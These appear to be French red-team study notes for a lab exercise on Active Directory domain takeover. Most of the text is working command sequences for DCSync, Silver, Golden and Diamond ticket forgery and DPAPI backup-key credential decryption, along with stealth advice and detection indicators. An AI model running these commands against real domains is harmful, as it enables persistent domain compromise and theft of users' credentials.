# Domain Dominance — Contrôle du domaine

> **Contexte :** cette phase intervient après l’obtention de privilèges Domain Admin ou équivalents. Les notes étudient les secrets AD et les mécanismes Kerberos qui peuvent maintenir des accès même après la perte de la session initiale.

> **Pas de lab dédié :** ces notions concernent les comptes privilégiés et les secrets de domaine. Dans une forêt contenant plusieurs domaines, chaque domaine possède son propre compte `krbtgt` et sa propre clé de sauvegarde DPAPI. Les Silver Tickets sont liés à un service et un hôte précis.

**Techniques présentées :**
- [DCSync](#dcsync) — étudier la récupération des hashes via le protocole de réplication du DC
- [Silver Tickets](#silver-tickets) — comprendre les tickets de service générés avec un secret de machine ou de service
- [Golden Tickets](#golden-tickets) — étudier les TGT associés au secret du compte `krbtgt`
- [Diamond Tickets](#diamond-tickets) — étudier la modification d’un TGT valide
- [DPAPI Backup Key](#dpapi-backup-key) — comprendre la clé de sauvegarde DPAPI du domaine et les données qu’elle protège

**Prérequis par technique :**

| Technique | Prérequis | Validité potentielle |
|-----------|----------|----------------|
| DCSync | Droits de réplication AD appropriés | Opération ponctuelle |
| Silver Ticket | Secret AES256 ou RC4 du compte machine/service concerné | Modification du mot de passe du compte ordinateur |
| Golden Ticket | Secret AES256 `krbtgt` et SID du domaine | Rotation du secret `krbtgt` |
| Diamond Ticket | Secret AES256 `krbtgt` et TGT valide dans le lab | `krbtgt` password change |
| DPAPI Backup Key | Permissions appropriées sur le Domain Controller | Rotation de la clé, dont la gestion doit être vérifiée |

---

## DCSync

**Fonctionnement :** DCSync utilise le protocole Directory Replication Service (DRS), normalement employé entre Domain Controllers. Avec les droits requis, il peut demander la réplication d’attributs sensibles, notamment des secrets d’authentification.

**Rôle de `krbtgt` :** ce compte protège les tickets TGT du domaine. La compromission de son secret met en danger l’authentification Kerberos. Sa rotation exige une procédure d’administration spécifique.

**Prérequis :** droits de réplication AD, généralement associés aux comptes Domain Admin, Enterprise Admin ou certains comptes de service.

### Examiner le secret `krbtgt` du lab

```
beacon> dcsync contoso.com CONTOSO\krbtgt
```

> `OPSEC-CAUTION` — les demandes de réplication DRS issues d’un hôte non-DC peuvent constituer un indicateur de compromission.  
> L’événement **4662** peut être généré lorsque l’audit des accès à l’annuaire est activé. Plusieurs GUID permettent de distinguer les permissions de réplication :
> - `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` → DS-Replication-Get-Changes and DS-Replication-Get-Changes-All
> - `89e95b76-444d-4c62-991a-0facbeda640c` → DS-Replication-Get-Changes-In-Filtered-Set
>
> **Surveillance :** les demandes de réplication depuis des adresses non répertoriées comme DC méritent une investigation. Les requêtes massives produisent un volume plus important.

### Étudier la réplication d’un compte particulier

```
beacon> dcsync contoso.com CONTOSO\krbtgt          # for golden/diamond tickets
beacon> dcsync contoso.com CONTOSO\Administrator   # DA hash for PTH / lateral movement
beacon> dcsync contoso.com CONTOSO\<target-user>   # any user's hash on demand
```

### Récupérer le SID du domaine

```
beacon> powerpick Get-DomainSID
# also visible in DCSync output — look for "Object Security ID" field
```

### Particularités des forêts multidomaines

> Dans une forêt multidomaine, chaque domaine enfant possède son propre `krbtgt`. Les tickets sont liés au SID du domaine et aux secrets Kerberos correspondants ; les secrets d’un domaine ne sont pas interchangeables entre domaines.

---

## Tickets Kerberos forgés

**Principe :** les tickets forgés utilisent des secrets Kerberos compromis pour construire des tickets sans passer par le cycle normal de délivrance du KDC. Leur validation dépend des signatures, des clés et des contrôles de sécurité du domaine.

---

### Silver Tickets

**Silver Ticket :** ticket de service Kerberos (TGS) associé au secret d’un compte machine ou service précis. Contrairement au Golden Ticket, il concerne un service et un hôte déterminés.

**Intérêt dans le scénario étudié :**
1. **Persistances locales :** le secret d’un compte ordinateur compromet la confiance accordée aux tickets de services de la machine, même après correction de la vulnérabilité initiale.
2. **Comptes de service :** la compromission d’un secret Kerberos de compte de service peut exposer les services qui dépendent de cette identité.

**Limite :** les comptes ordinateurs peuvent changer périodiquement leur secret, notamment selon les politiques Active Directory.

#### Cas 1 — Ticket CIFS lié au compte ordinateur

Commande de l’exercice à exécuter sur le poste Windows du lab, et non dans le Beacon :

```powershell
# Forge a silver ticket for CIFS on lon-db-1, impersonating Administrator
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver `
  /service:cifs/lon-db-1 `
  /aes256:bc6fd6e8519b52e09f60961beeee083a441c25908e30a6c29b124b516e06945f `
  /user:Administrator `
  /domain:CONTOSO.COM `
  /sid:S-1-5-21-3926355307-1661546229-813047887 `
  /nowrap
```

**Paramètres :**
- `/service` — service cible et hôte (format : `cifs/hostname` or `http/hostname` etc.)
- `/aes256` — secret AES256 du compte ordinateur `lon-db-1$` dans le scénario
- `/user` — nom d’utilisateur représenté par le ticket du lab
- `/domain` — FQDN du domaine
- `/sid` — SID du domaine, issu de `Get-DomainSID` ou des informations de réplication
- `/nowrap` — sortie Base64 du ticket sur une seule ligne

> Valeurs par défaut indiquées pour Rubeus : RID utilisateur 500 et groupes 520, 512, 513, 519, 518. Les options `/id` et `/groups` les définissent explicitement.

Importer le ticket et vérifier son état :

```
beacon> make_token CONTOSO\Administrator FakePass
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:doIFb[...snip...]kYi0x
beacon> run klist
beacon> ls \\lon-db-1\c$
beacon> rev2self
```

> Dans ce lab, `make_token` crée une session réseau de type 9. `ptt` importe un ticket dans le cache Kerberos ; `klist` affiche les tickets de la session et `rev2self` termine l’impersonation.

#### Cas 2 — Service MSSQLSvc et compte de service

Le scénario compare les permissions d’un compte de service SQL standard à celles d’un compte disposant du rôle `sysadmin`.

**Étape 1 — Étudier la dérivation des clés depuis un mot de passe :**

```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash `
  /user:mssql_svc `
  /domain:CONTOSO.COM `
  /password:Passw0rd!
```

> La sortie présente les secrets RC4 (NTLM) et AES128/AES256. Le choix de l’algorithme dépend du domaine et de ses politiques Kerberos.

**Étape 2 — Étudier le ticket de service MSSQLSvc :**

```powershell
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver `
  /service:MSSQLSvc/lon-db-1.contoso.com:1433 `
  /rc4:FC525C9683E8FE067095BA2DDC971889 `
  /user:rsteel `
  /id:1108 `
  /groups:513,1106,1107,4602 `
  /domain:CONTOSO.COM `
  /sid:S-1-5-21-3926355307-1661546229-813047887 `
  /nowrap
```

> `/id` = RID de `rsteel`, identifiable dans son `objectsid`.  
> `/groups` = RID des groupes du lab : 513 (Domain Users), 1106 (Workstation Admins), 1107 (Server Admins), 4602 (Database Admins). Leur influence sur SQL Server dépend des groupes et rôles autorisés.  
> Pour relever les RID des groupes : `powerpick Get-DomainGroup | select name,objectsid`

Importer le ticket et examiner son usage :

```
beacon> make_token CONTOSO\rsteel FakePass
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:doIFVz[...snip...]50b3NvLmNvbToxNDMz
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:lon-db-1.contoso.com /m:info
```

#### Indicateurs OPSEC — Silver Tickets

> `OPSEC-CAUTION`  
> **Validation du PAC :** les contrôles de signature Kerberos et les mécanismes de validation renforcés peuvent révéler des tickets de service construits en dehors des échanges normaux avec le KDC.  
>
> **Corrélation d’événements :** une connexion de type 4624 sans requête TGS-REQ (4769) correspondante peut constituer un signal à examiner, selon la configuration de journalisation.  
>
> **Anomalies :** vérifier le format du realm Kerberos, notamment l’utilisation des majuscules.

---

### Golden Tickets

**Golden Ticket :** TGT construit avec le secret du compte `krbtgt`. Les tickets de service peuvent ensuite être demandés via les échanges Kerberos standards si les contrôles l’acceptent.

**Différence avec Silver Ticket :** un TGT concerne l’authentification Kerberos auprès du KDC plutôt qu’un service unique. La compromission du secret `krbtgt` met donc potentiellement en danger une plus grande partie du domaine.

**Durée du risque :** la rotation de `krbtgt` suit une procédure d’administration spécifique. Les recommandations de remédiation prévoient généralement deux rotations espacées et contrôlées.

### Exemple du lab — Golden Ticket

```powershell
# Run on attacker Windows machine
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden `
  /aes256:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c `
  /user:Administrator `
  /domain:CONTOSO.COM `
  /sid:S-1-5-21-3926355307-1661546229-813047887 `
  /nowrap
```

**Paramètres :**
- `/aes256` — secret AES256 de `krbtgt` dans le scénario
- `/user` — nom du compte utilisateur représenté par le ticket
- `/domain` — FQDN du domaine courant
- `/sid` — SID du domaine courant

Importer le ticket et vérifier son état :

```
beacon> make_token CONTOSO\Administrator FakePass
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:doIFg[...snip...]uQ09N
beacon> run klist
beacon> ls \\lon-dc-1\c$
beacon> rev2self
```

#### Indicateurs OPSEC — Golden Tickets

> `OPSEC-CAUTION`  
> **Absence d’AS-REQ (4768) :** une demande de ticket de service (4769) sans demande préalable de TGT (4768) peut constituer une anomalie, selon l’historique et la journalisation.  
>
> **Durée du ticket :** un ticket présentant une durée très éloignée de la politique Kerberos du domaine est suspect. La durée doit être comparée aux paramètres réellement configurés sur le KDC.  
>
> **Nom d’utilisateur :** des incohérences entre le compte figurant dans un ticket et les objets réels de l’annuaire peuvent apparaître dans les journaux.

---

### Diamond Tickets

**Diamond Ticket :** le scénario part d’un TGT émis par le KDC, puis examine sa modification à partir du secret `krbtgt`. Les différences principales portent sur l’origine et les métadonnées du ticket.

**Différences avec un Golden Ticket :**
- Certaines métadonnées du ticket proviennent initialement d’un TGT délivré par le KDC.
- La requête AS-REQ (événement 4768) du ticket initial existe dans les journaux, selon les paramètres d’audit.
- La durée du ticket d’origine suit la politique du domaine.

**Prérequis dans le lab :** secret AES256 `krbtgt` et session Beacon disposant d’un TGT exploitable par le scénario.

### Exemple du lab — Diamond Ticket

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond `
  /tgtdeleg `
  /krbkey:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c `
  /ticketuser:Administrator `
  /ticketuserid:500 `
  /domain:CONTOSO.COM `
  /nowrap
```

**Paramètres :**
- `/tgtdeleg` — décrit l’usage d’un TGT dans le contexte du Beacon courant.
- `/krbkey` — secret AES256 `krbtgt` dans le lab
- `/ticketuser` — utilisateur représenté dans le ticket du lab
- `/ticketuserid` — RID de cet utilisateur (500 correspond à Administrator intégré)
- `/domain` — FQDN du domaine courant

> Dans le lab, Rubeus produit le TGT initial et le ticket modifié ; la sortie contient donc deux éléments différents.  
> Groupes indiqués par défaut : 520, 512, 513, 519, 518 ; option de configuration `/groups`.

### Vérifier les informations du ticket

```powershell
# Describe original TGT (should show current user)
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe `
  /servicekey:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c `
  /ticket:doIFm[...first-ticket-snip...]kNPTQ==

# Describe diamond ticket (should show Administrator)
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe `
  /servicekey:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c `
  /ticket:doIF7[...second-ticket-snip...]kNPTQ==
```

> Le champ `FullName` peut encore contenir l’identité d’origine, ce qui constitue une incohérence potentiellement observable.

Importer le ticket et examiner son usage :

```
beacon> make_token CONTOSO\Administrator FakePass
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:doIF5[...diamond-snip...]5DT00=
beacon> run klist
beacon> ls \\lon-dc-1\c$
beacon> rev2self
```

#### Indicateurs OPSEC — Diamond Tickets

> `OPSEC-SAFE` par comparaison avec les Golden Tickets dans ces notes.  
> Le ticket initial possède une requête AS-REQ (4768) ; la corrélation des événements peut donc différer de celle d’un Golden Ticket.  
> Les métadonnées initiales reprennent celles du ticket émis par le KDC.  
> **Remarque :** les notes comparent les deux types de tickets ; les risques et traces réelles dépendent des contrôles Kerberos.

---

### Tickets Kerberos forgés — Exam Decision Guide

```
Do you need to forge a ticket for a SPECIFIC service on a SPECIFIC host?
  └─ Yes → Silver Ticket (needs service/computer account hash)

Do you need unrestricted DA-equivalent access across the domain?
  └─ Yes, and you have an active beacon → Diamond Ticket (stealthier)
  └─ Yes, no beacon / need offline forgery → Golden Ticket (OPSEC-CAUTION)

Do you need to impersonate a sysadmin user on a SQL server you can't access directly?
  └─ Silver Ticket for MSSQLSvc (use Kerberoasted service account hash)
```

---

## DPAPI Backup Key

**DPAPI :** la Data Protection API protège notamment les identifiants du Credential Manager, certaines données navigateur et les secrets liés à RDP. Les données sont chiffrées avec des clés maîtresses associées au contexte utilisateur.

**Clé de sauvegarde :** dans un domaine Active Directory, DPAPI utilise des mécanismes de récupération qui protègent l’accès aux clés maîtresses après certains changements de mot de passe. La clé de sauvegarde du domaine est particulièrement sensible.

**Enjeu :** la compromission de la clé de sauvegarde DPAPI du domaine peut mettre en danger de nombreux secrets utilisateurs. Sa gestion et sa rotation diffèrent de celles des mots de passe classiques.

### Examiner la clé de sauvegarde DPAPI du domaine

Cette étape du lab suppose les permissions appropriées sur le domaine :

```
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe backupkey
```

> `OPSEC-CAUTION` — le protocole de sauvegarde DPAPI implique des échanges distants avec un DC ; leur journalisation dépend de la configuration.  
> La sortie du lab représente une clé PVK en Base64 ; ce type de secret doit être traité comme une information hautement sensible.

### Étudier le déchiffrement DPAPI avec la clé de sauvegarde

**Étape 1 — Vérifier l’identité du Beacon :**

```
beacon> getuid
```

> Les droits Domain Admin ne rendent pas automatiquement tous les fichiers accessibles. L’étude de DPAPI nécessite les fichiers de secrets et les clés correspondantes.

**Étape 2 — Recenser les fichiers DPAPI accessibles :**

```
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials
```

> La disponibilité des clés DPAPI varie selon le compte, la session et les droits d’accès. La méthode `/rpc` ne remplace pas toutes les clés nécessaires pour d’autres profils utilisateurs.

**Étape 3 — Examiner le résultat du déchiffrement dans le lab :**

```
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /pvk:HvG1s[...backup-key-base64...]lXQns=
```

> L’option `/pvk` indique la clé de sauvegarde utilisée dans le scénario.  
> SharpDPAPI traite les données DPAPI accessibles dans le profil et les chemins autorisés. Les sorties peuvent contenir des secrets d’authentification.  
> `OPSEC-CAUTION` — les accès aux fichiers de secrets peuvent être consignés si l’audit est activé.

### Types de données protégées par DPAPI

| Type de donnée | Emplacement |
|-----------------|----------|
| Windows Credential Manager | `%APPDATA%\Microsoft\Credentials\` |
| Mots de passe enregistrés dans le navigateur | Chrome/Edge: `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data` |
| Identifiants RDP enregistrés | DPAPI-protected in Credential Manager |
| WiFi PSKs | `C:\ProgramData\Microsoft\Wlansvc\Profiles\` |
| Clés privées de certificats | `%APPDATA%\Microsoft\Crypto\RSA\` |

### DPAPI et plusieurs profils utilisateurs dans le lab

```
# From a DA beacon, enumerate a different user's credential files
beacon> ls C:\Users\<target-user>\AppData\Roaming\Microsoft\Credentials\
beacon> download C:\Users\<target-user>\AppData\Roaming\Microsoft\Credentials\<blob>

# On attacker machine — decrypt using backup key
SharpDPAPI.exe credentials /pvk:<backup-key-base64>
```

---

## Aide-mémoire pour l’examen

### Informations à vérifier dans le contexte Domain Admin

```
# 1. Get domain SID
beacon> powerpick Get-DomainSID

# 2. DCSync krbtgt (for golden/diamond tickets)
beacon> dcsync contoso.com CONTOSO\krbtgt

# 3. DCSync Administrator (backup access)
beacon> dcsync contoso.com CONTOSO\Administrator

# 4. Pull DPAPI backup key
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe backupkey

# 5. Note: save krbtgt AES256, domain SID, and backup key PVK offline
```

### Récapitulatif des secrets et identifiants

| Information | Outil | Source |
|------|------|--------|
| SID du domaine | `Get-DomainSID` ou résultat de DCSync | AD |
| krbtgt AES256 | `dcsync CONTOSO\krbtgt` | DC |
| Secret AES256 du compte ordinateur | `dcsync CONTOSO\<machine>$` ou extraction LSASS dans le lab | Target host |
| Hash d’un compte de service | Rubeus `hash` à partir du mot de passe ou d’un résultat Kerberoasting | variable |
| RID utilisateur | `Get-DomainUser <user> \| select objectsid` | AD |
| RID des groupes | `Get-DomainGroup \| select name,objectsid` | AD |

### Niveaux OPSEC de cette phase

| Technique | Niveau | Détection possible |
|-----------|------|-------------------|
| DCSync (targeted) | CAUTION | Événement 4662 depuis une adresse non-DC |
| Silver ticket (computer acct) | CAUTION | 4624 sans 4769 corrélé ; échec de validation PAC |
| Silver ticket (service acct) | CAUTION | Même type de détection |
| Golden ticket | CAUTION | 4768 manquant ou durée de ticket anormale |
| Diamond ticket | SAFE (relative) | Incohérence du champ FullName |
| DPAPI backup key extraction | CAUTION | Requête RPC au DC et accès aux fichiers |

### Importer un ticket — schéma commun du lab

```
beacon> make_token CONTOSO\<impersonated-user> FakePass
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:<base64-ticket>
beacon> run klist
beacon> <access the target resource>
beacon> rev2self
```

> Après les vérifications du lab, `rev2self` remet le Beacon dans son contexte d’identité initial.

### Récapitulatif des commandes Rubeus

```powershell
# Silver — computer account (CIFS)
Rubeus.exe silver /service:cifs/<host> /aes256:<hash> /user:Administrator /domain:<FQDN> /sid:<SID> /nowrap

# Silver — service account (MSSQLSvc)
Rubeus.exe silver /service:MSSQLSvc/<host.fqdn>:<port> /rc4:<hash> /user:<sysadmin-user> /id:<RID> /groups:<RIDs> /domain:<FQDN> /sid:<SID> /nowrap

# Golden
Rubeus.exe golden /aes256:<krbtgt-hash> /user:Administrator /domain:<FQDN> /sid:<SID> /nowrap

# Diamond (preferred — run in beacon)
execute-assembly Rubeus.exe diamond /tgtdeleg /krbkey:<krbtgt-aes256> /ticketuser:Administrator /ticketuserid:500 /domain:<FQDN> /nowrap

# Pass-the-ticket (inject)
execute-assembly Rubeus.exe ptt /ticket:<base64>

# Hash conversion (plaintext → RC4/AES)
Rubeus.exe hash /user:<user> /domain:<FQDN> /password:<plaintext>

# Describe ticket contents
Rubeus.exe describe /servicekey:<krbtgt-aes256> /ticket:<base64>
```

### Récapitulatif des commandes SharpDPAPI

```
# Extract domain backup key (DA required)
execute-assembly SharpDPAPI.exe backupkey

# Decrypt current user's credentials
execute-assembly SharpDPAPI.exe credentials

# Decrypt any user's credentials using backup key
execute-assembly SharpDPAPI.exe credentials /pvk:<base64-backup-key>
```
